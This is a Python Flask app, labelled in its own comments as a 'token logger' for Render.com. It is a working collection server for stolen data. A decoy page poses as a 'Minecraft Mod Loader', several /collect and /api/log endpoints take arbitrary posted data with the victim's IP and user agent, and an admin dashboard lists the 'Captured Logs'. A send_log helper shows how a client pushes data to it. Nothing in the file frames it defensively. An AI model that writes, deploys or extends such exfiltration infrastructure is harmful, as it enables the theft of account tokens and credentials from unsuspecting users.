# Flask token logger for Render.com
# Requirements: pip install flask gunicorn requests
# Deploy: push to GitHub, connect to Render, start command: gunicorn app:app
# Set environment variables on Render: ADMIN_PASSWORD, SECRET_KEY

import os
import json
import datetime
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'change-this-secret-key-in-render-env')

ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# Persistent storage - use /tmp on Render (ephemeral) or mount a Render Disk
LOG_FILE = os.environ.get('LOG_FILE', '/tmp/logs.json')

# ============================================================
# TEMPLATES
# ============================================================

LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Minecraft Mod Loader</title></head>
<body style="background:#111;color:#eee;font-family:sans-serif;text-align:center;padding:50px;">
<h1>Loading resources...</h1>
<p>Please wait while we verify your session.</p>
</body>
</html>
"""

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Admin Login</title></head>
<body style="background:#111;color:#eee;font-family:monospace;padding:40px;">
<h2>Admin Authentication</h2>
<form method="POST" action="/admin/login">
<input type="password" name="password" placeholder="Password" style="padding:8px;font-size:16px;">
<button type="submit" style="padding:8px 16px;font-size:16px;">Login</button>
</form>
{% if error %}<p style="color:red;">{{ error }}</p>{% endif %}
</body>
</html>
"""

DASHBOARD_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Logs</title>
<style>
body { background:#111; color:#eee; font-family:monospace; padding:20px; }
.section { border:1px solid #444; border-radius:6px; margin-bottom:16px; padding:14px; background:#1a1a1a; }
.section h3 { margin:0 0 8px 0; color:#6cf; }
pre { white-space:pre-wrap; word-break:break-all; margin:0; }
.meta { color:#888; font-size:12px; margin-bottom:6px; }
</style>
<meta http-equiv="refresh" content="10">
</head>
<body>
<h1>Captured Logs ({{ entries|length }})</h1>
<p><a href="/admin/logout" style="color:#6cf;">Logout</a></p>
{% for entry in entries|reverse %}
<div class="section">
<h3>Log #{{ entries|length - loop.index0 }} - {{ entry.timestamp }}</h3>
<div class="meta">IP: {{ entry.ip }} | UA: {{ entry.user_agent }}</div>
<pre>{{ entry.data }}</pre>
</div>
{% endfor %}
{% if not entries %}<p>No logs yet.</p>{% endif %}
</body>
</html>
"""

# ============================================================
# STORAGE
# ============================================================

def load_logs():
    if not os.path.exists(LOG_FILE):
        return []
    try:
        with open(LOG_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return []

def save_log(entry):
    logs = load_logs()
    logs.append(entry)
    with open(LOG_FILE, 'w') as f:
        json.dump(logs, f, indent=2)

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    return render_template_string(LANDING_PAGE)

# Primary endpoint - accepts JSON, form data, or raw text
@app.route('/collect', methods=['POST'])
def collect():
    if request.is_json:
        data = request.get_json(silent=True)
    elif request.form:
        data = request.form.to_dict()
    else:
        data = request.get_data(as_text=True)

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'unknown')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    entry = {
        'timestamp': timestamp,
        'ip': client_ip,
        'user_agent': user_agent,
        'data': json.dumps(data, indent=2) if isinstance(data, (dict, list)) else str(data)
    }
    save_log(entry)
    print(f"[+] New log from {client_ip}")
    return jsonify({'status': 'ok'}), 200

# Raw text endpoint
@app.route('/api/log', methods=['POST'])
def api_log():
    raw = request.get_data(as_text=True)
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'unknown')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    entry = {
        'timestamp': timestamp,
        'ip': client_ip,
        'user_agent': user_agent,
        'data': raw
    }
    save_log(entry)
    return jsonify({'status': 'ok'}), 200

# GET-based collection
@app.route('/collect', methods=['GET'])
def collect_get():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'unknown')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    entry = {
        'timestamp': timestamp,
        'ip': client_ip,
        'user_agent': user_agent,
        'data': json.dumps(request.args.to_dict(), indent=2)
    }
    save_log(entry)
    return jsonify({'status': 'ok'}), 200

# ============================================================
# ADMIN
# ============================================================

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin'] = True
            return redirect(url_for('admin_dashboard'))
        return render_template_string(LOGIN_PAGE, error='Invalid password')
    return render_template_string(LOGIN_PAGE, error=None)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

@app.route('/admin')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    entries = load_logs()
    return render_template_string(DASHBOARD_PAGE, entries=entries)

# ============================================================
# CLIENT TEST / SENDER (example - remove or keep as reference)
# ============================================================

def send_log(server_url, payload, raw=False):
    """
    Helper to send data to the server from a client.
    server_url: base URL e.g. https://your-app.onrender.com
    payload: dict for JSON or string for raw
    raw: if True posts to /api/log as raw text
    """
    import requests
    if raw:
        r = requests.post(f"{server_url}/api/log", data=str(payload))
    else:
        r = requests.post(f"{server_url}/collect", json=payload)
    return r.status_code, r.text

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    # Local dev only - on Render use: gunicorn app:app
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
